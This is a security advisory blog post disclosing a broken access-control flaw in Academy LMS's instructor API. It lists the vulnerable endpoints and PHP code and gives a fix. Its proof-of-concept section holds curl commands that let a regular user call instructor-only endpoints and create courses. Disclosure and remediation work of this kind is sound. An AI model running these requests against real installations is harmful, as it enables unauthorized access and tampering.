---
title: "Privilege Escalation Vulnerability in Academy LMS Api_instructor Controller"
date: 2025-07-20
tags: ["security", "privilege-escalation", "academy-lms", "vulnerability"]
categories: ["Security Research"]
draft: false
url: "/academy-lms-instructor-escalation-3n7b9f2w5k/"
_build:
  list: false
  render: true
  publishResources: true
sitemap:
  disable: true
---

## Overview

A significant privilege escalation vulnerability has been identified in Academy LMS versions up to and including 5.13, allowing regular users to access instructor-only functionality without proper authorization.

## Technical Details

**CVE ID:** [CVE-2025-56747](https://nvd.nist.gov/vuln/detail/CVE-2025-56747)
**CVSS Score:** 8.6 (High)  
**Affected Versions:** Academy LMS ≤ v5.13  
**Vulnerability Type:** Privilege Escalation / Access Control Bypass  

### Affected Component
- File: `lms/application/controllers/Api_instructor.php`
- Lines: 20, 47, 91, 110, 124, 135, 148, 155, 168, 181, 195

### Vulnerability Description

The Api_instructor controller fails to properly validate user roles before granting access to instructor-specific functions. While the system checks for valid JWT tokens, it does not verify the `is_instructor=1` flag in the user's database record, allowing any authenticated user to access instructor functionality.

### Vulnerable Source Code

```php
// From lms/application/controllers/Api_instructor.php:20-35
public function token_data_get($auth_token)
{
  if (isset($auth_token)) {
    try {
      $jwtData = $this->tokenHandler->DecodeToken($auth_token);
      return json_encode($jwtData);
    } catch (Exception $e) {
      echo 'catch';
      http_response_code('401');
      echo json_encode(array("status" => false, "message" => $e->getMessage()));
      exit;
    }
  } else {
    echo json_encode(array("status" => false, "message" => "Invalid Token"));
  }
}

// From lms/application/controllers/Api_instructor.php:47-54  
public function change_password_post()
{
  $response = array();
  if (isset($_POST['auth_token']) && !empty($_POST['auth_token']) /* ... */) {
    $auth_token = $_POST['auth_token'];
    $logged_in_user_details = json_decode($this->token_data_get($auth_token), true);
    if ($logged_in_user_details['user_id'] > 0) {
      // Missing: Check if user has is_instructor=1 flag
      $response = $this->api_instructor_model->change_password_post($logged_in_user_details['user_id']);
    }
  }
}
```

## Impact

A regular authenticated user can:
1. Create unlimited courses without instructor privileges
2. Modify existing course content
3. Access sensitive instructor data and analytics
4. Change instructor passwords and profile information
5. Manipulate course pricing and availability
6. Bypass the platform's business model entirely

## Affected Endpoints

The following API endpoints are vulnerable to privilege escalation:

```
GET  /lms/api_instructor/userdata
POST /lms/api_instructor/update_userdata
POST /lms/api_instructor/add_course
POST /lms/api_instructor/update_course
GET  /lms/api_instructor/courses
GET  /lms/api_instructor/token_data
POST /lms/api_instructor/change_password
POST /lms/api_instructor/change_profile_photo
GET  /lms/api_instructor/add_course_form
GET  /lms/api_instructor/edit_course_form
GET  /lms/api_instructor/update_course_status
```

## Proof of Concept

```bash
# 1. Login as regular user
curl -X POST "https://target.com/lms/api/login" \
  -d "email=regularuser@example.com&password=userpass"

# 2. Extract JWT token from response
JWT_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."

# 3. Access instructor functionality (should fail but doesn't)
curl -X GET "https://target.com/lms/api_instructor/userdata?auth_token=${JWT_TOKEN}"

# 4. Create unauthorized course
curl -X POST "https://target.com/lms/api_instructor/add_course" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "auth_token=${JWT_TOKEN}&title=Unauthorized Course&description=Created by regular user"
```

## Root Cause Analysis

The vulnerability exists because the Api_instructor controller only performs the following check:

```php
// Insufficient validation - only checks JWT validity
if (!$this->jwt_model->validate_jwt_token()) {
    // Reject request
}
// Missing: Check if user has is_instructor=1 flag
```

The correct implementation should include:

```php
// Proper validation
if (!$this->jwt_model->validate_jwt_token()) {
    // Reject request
}

$user_data = $this->jwt_model->get_user_data_from_token();
if ($user_data['is_instructor'] != 1) {
    // Reject - user is not an instructor
}
```

## Mitigation

### Immediate Fix
Add proper instructor role validation to all methods in the Api_instructor controller:

```php
public function __construct() {
    parent::__construct();
    
    // Validate JWT token
    if (!$this->jwt_model->validate_jwt_token()) {
        http_response_code(401);
        echo json_encode(['error' => 'Unauthorized']);
        exit;
    }
    
    // Validate instructor role
    $user_data = $this->jwt_model->get_user_data_from_token();
    if (!isset($user_data['is_instructor']) || $user_data['is_instructor'] != 1) {
        http_response_code(403);
        echo json_encode(['error' => 'Insufficient privileges']);
        exit;
    }
}
```

### Best Practices
1. Implement role-based access control consistently
2. Use middleware for authorization checks
3. Validate user permissions at the database level
4. Implement proper error handling for authorization failures
5. Add audit logging for privilege escalation attempts

## Business Impact

This vulnerability can result in:
- Financial losses due to unauthorized course creation
- Compromise of the platform's business model
- Data exposure of instructor analytics and earnings
- Reputation damage and loss of user trust

## Timeline

- **Discovery:** July 2025 (During white box penetration testing)
- **Vendor Notification:** July 20, 2025 (Responsible disclosure to Creativeitem/Academy LMS team)
- **CVE Request Submitted:** July 20, 2025 (CVE number requested from MITRE)
- **Vendor Response:** Awaiting response from vendor
- **Public Disclosure:** July 20, 2025

*This vulnerability was discovered during a white box penetration test. Given that Academy LMS is a widely-used commercial template with many installations across different organizations, we decided to report this as a responsible disclosure to help protect all users of this platform.*

*This timeline will be updated accordingly as the responsible disclosure process progresses.*

## References

- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [Academy LMS Documentation](https://codecanyon.net/item/academy-learning-management-system/22703468)

## Credit

This vulnerability was discovered and responsibly disclosed by the security research team at suryadina.com.

---
*This post is part of our ongoing security research into popular Learning Management Systems. For more security insights, visit [https://suryadina.com](https://suryadina.com).*
